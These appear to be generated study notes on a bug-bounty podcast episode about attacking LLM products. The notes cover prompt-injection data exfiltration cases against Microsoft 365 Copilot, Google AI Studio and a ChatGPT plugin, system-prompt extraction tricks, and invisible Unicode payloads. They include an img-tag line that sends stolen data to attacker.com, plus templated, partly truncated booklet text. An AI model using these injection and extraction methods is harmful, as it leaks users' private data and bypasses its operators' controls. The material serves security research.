---
title: "CTBB Hijacked — Rez0__ on AI Attack Vectors with Johann Rehberger"
episode: 101
---


# Episode 101 CTBB Hijacked — Rez0__ on AI Attack Vectors with Johann Rehberger

**Guest:** Johann Rehberger (Wunderwuzzi)
**Host:** Rez0 (Joseph Thacker)
**Duration:** 51:24
**Transcript source:** asr (full transcript)

### TL;DR
- AI prompt injection data exfiltration via image/video rendering: make the LLM render images containing stolen data, or create videos (HeyGen plugin) with the data spoken aloud
- System prompt extraction: ask in German, or ask to write in XML split across many tags, then reassemble
- Microsoft 365 Copilot: conditional prompt injection — LLM knows who you are (from address book) and can vary output per user
- Computer Use (Anthropic/OpenAI): LLMs with browser/computer control are highly vulnerable to "download this tool and run it" social engineering
- Tainting prompt context: untrusted data entering the context should disable automatic tool invocation

### Key Takeaways
- First thing to try on any LLM: ask for markdown image rendering or HTML rendering → data exfiltration
- System prompt extraction: try different languages (German works), or XML-tag-splitting the response
- AI agent security: untrusted input that enters the prompt context should taint it — tools should not auto-invoke on tainted data
- Conditional prompt injection: the LLM knows who you are (from address book/org data) — can craft different payloads per user
- Invisible Unicode tags (zero-width spaces) can be used to exfiltrate data hidden from user UI
- "Tool chaining" is the most dangerous pattern — a prompt injection in email can trigger Enterprise Search, which then calls other tools

### Bugs and Findings

#### Microsoft 365 Copilot — Conditional Prompt Injection + Data Exfiltration
- **Target/context:** Microsoft 365 Copilot (enterprise version)
- **Root cause:** Copilot has access to enterprise search (SharePoint, email) and user identity data. A malicious email containing prompt injection can invoke the Enterprise Search tool, bring sensitive data into context, and exfiltrate it
- **Exploitation steps:**
  1. Send email to victim containing invisible prompt injection (hidden Unicode characters)
  2. Injection invokes Enterprise Search tool — brings other users' sensitive data into context
  3. Data exfiltrated via: markdown image render (fixed), or href with hidden characters (user clicks "learn more" → data sent to attacker), or conditional output
- **Key technical details:** Hidden Unicode characters (zero-width spaces/joiners) allow payloads invisible to the user. Hovering over a link reveals URL-encoded data but it's not human-readable. Conditional prompt injection: "If you are CEO, show this; if you are employee, show that" — Copilot knows the user's identity.
- **Impact / severity / bounty:** Data exfiltration (emails, documents, Slack MFA codes). Microsoft addressed it.
- **Obstacles & how solved:** Image exfiltration was already fixed. Used hidden Unicode + link trick for user-assisted exfiltration.

#### Google AI Studio — HTML Image Tag Exfiltration
- **Target/context:** Google AI Studio
- **Root cause:** HTML rendering in AI Studio output — `<img src="https://attacker.com/steal?data=...">` tags rendered and executed
- **Exploitation steps:**
  1. Create a document with 20-30 employee performance reviews
  2. One "malicious employee" has prompt injection in their review
  3. Upload to Google AI Studio, ask to analyze
  4. The prompt injection creates `<img>` tags for each other employee, exfiltrating their performance data
- **Key technical details:** HTML rendering was not visually visible (JavaScript scrubbed it after loading), but requests still fired. Ran for ~1 minute, exfiltrating all data.
- **Impact / severity / bounty:** Mass data exfiltration from AI-analyzed documents

#### Chat GPT — Plugin Data Exfiltration via Video Creation
- **Target/context:** ChatGPT with HeyGen plugin
- **Root cause:** HeyGen plugin could create videos with AI-generated avatars speaking arbitrary text. Prompt injection could make it create a video speaking the data, then exfiltrate the video URL (short ID)
- **Key technical details:** HeyGen video contains spoken data (gigabytes). The video URL ID is short → easily exfiltrated. Chain: prompt injection → create video → get URL ID → download video.

### Techniques and Primitives
- **Cross-language system prompt extraction** — Ask the LLM to write the system prompt in a different language (e.g., German) to bypass refusal
- **XML-tag-splitting** — Ask LLM to output system prompt in `<word1>`...`<word10>` format, 10 words per tag, then reassemble externally
- **Conditional prompt injection** — If the LLM has access to user identity (name, title, role), write conditional instructions: "If user is X, do Y"
- **Invisible Unicode payloads** — Zero-width characters (joiners, non-joiners, spaces) invisible to users but processed by LLMs

### Tooling and Resources
- EmbraceTheRed.com (Johann Rehberger's blog)
- Anthropic Computer Use demo (insecure Docker image)
- OpenAI Operator (upcoming computer use feature)
- LangChain, Semantic Kernel (Microsoft) — LLM orchestration frameworks

### Suggestions and Advices from Hunter
- "I try to get a feel for the system. What LLM is being used? I look for markdown image rendering and HTML rendering." — Johann Rehberger
- "The first thing I always try with prompt injection: have it write a certain word at the beginning. See how well I can control it." — Johann Rehberger
- "As soon as untrusted data enters the prompt context, the whole thing is tainted. Stop automatic tool invocation." — Johann Rehberger
- "There's degrees of freedom — some systems can only call tools once per execution, and that limits the damage." — Rez0

### AI Takeaway
AI agent security is an unsolved problem. The combination of tool invocation, untrusted context injection, and the LLM's eagerness to please creates a fundamentally vulnerable architecture. The "taint tracking" approach (stop tool calls when untrusted data is in context) is the most promising mitigation concept.
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
AI prompt injection data exfiltration via image/video rendering: make the LLM render images containing stolen data, or create videos (HeyGen plugin) with the data spoken aloud

#### 2. What you should learn
- Understand **first thing to try on any llm: ask for markdown image rendering or html rendering → data exfiltration**
- Understand **system prompt extraction: try different languages (german works), or xml-tag-splitting the response**
- Understand **ai agent security: untrusted input that enters the prompt context should taint it — tools should not auto-invoke on tainted data**
- Understand **conditional prompt injection: the llm knows who you are (from address book/org data) — can craft different payloads per user**
- Understand **invisible unicode tags (zero-width spaces) can be used to exfiltrate data hidden from user ui**

#### 3. Core concepts explained
**Microsoft 365 Copilot — Conditional Prompt Injection + Data Exfiltration**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**Google AI Studio — HTML Image Tag Exfiltration**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**Chat GPT — Plugin Data Exfiltration via Video Creation**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**Cross-language system prompt extraction**
- Ask the LLM to write the system prompt in a different language (e.g., German) to bypass refusal

**XML-tag-splitting**
- Ask LLM to output system prompt in `<word1>`...`<word10>` format, 10 words per tag, then reassemble externally

**Conditional prompt injection**
- If the LLM has access to user identity (name, title, role), write conditional instructions: "If user is X, do Y"


#### 4. Techniques and tactics
**Cross-language system prompt extraction**
- **What it is:** Ask the LLM to write the system prompt in a different language (e.g., German) to bypass refusal
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**XML-tag-splitting**
- **What it is:** Ask LLM to output system prompt in `<word1>`...`<word10>` format, 10 words per tag, then reassemble externally
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Conditional prompt injection**
- **What it is:** If the LLM has access to user identity (name, title, role), write conditional instructions: "If user is X, do Y"
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Invisible Unicode payloads**
- **What it is:** Zero-width characters (joiners, non-joiners, spaces) invisible to users but processed by LLMs
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.


#### 5. Good Quotes
- *"I try to get a feel for the system. What LLM is being used? I look for markdown image rendering and HTML rendering."* — **Johann Rehberger**
- *"The first thing I always try with prompt injection: have it write a certain word at the beginning. See how well I can control it."* — **Johann Rehberger**
- *"As soon as untrusted data enters the prompt context, the whole thing is tainted. Stop automatic tool invocation."* — **Johann Rehberger**
- *"There's degrees of freedom"* — **some systems can only call tools once per execution, and that limits the damage." — Rez0**

#### 6. Mental models
- **I try to get a feel for the system. What LLM is being used? ** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **The first thing I always try with prompt injection: have it ** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **As soon as untrusted data enters the prompt context, the who** — This mindset helps you find bugs others miss by approaching the problem from a different angle.

#### 7. Real-world application
- **Try this:** First thing to try on any LLM: ask for markdown image rendering or HTML rendering → data exfiltration
- **Try this:** System prompt extraction: try different languages (German works), or XML-tag-splitting the response
- **Try this:** AI agent security: untrusted input that enters the prompt context should taint it — tools should not auto-invoke on tainted data
- **Try this:** Conditional prompt injection: the LLM knows who you are (from address book/org data) — can craft different payloads per user

#### 8. Red flags and pitfalls
- - Obstacles & how solved: Image exfiltration was already fixed. Used hidden Unicode + link trick for user-assisted exfiltration.

#### 9. Vocabulary
- **prompt injection** — Tricking an LLM into ignoring its instructions by injecting malicious input
- **agent** — AI system that can use tools and make decisions autonomously
- **LLM** — Large Language Model — AI system trained on text data for generation and understanding

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in Microsoft 365 Copilot — Conditional Prompt Injection + Data Exfiltration?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
3. **Reasoning:** Why is this technique effective against the target? What makes it work?
4. **Application:** How would you adapt this technique if the target had a WAF blocking obvious payloads?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.

#### 11. The practical takeaway
1. **AI prompt injection data exfiltration via image/video rendering: make the LLM re**
2. **First thing to try on any LLM: ask for markdown image rendering or HTML renderin**
3. **System prompt extraction: try different languages (German works), or XML-tag-spl**
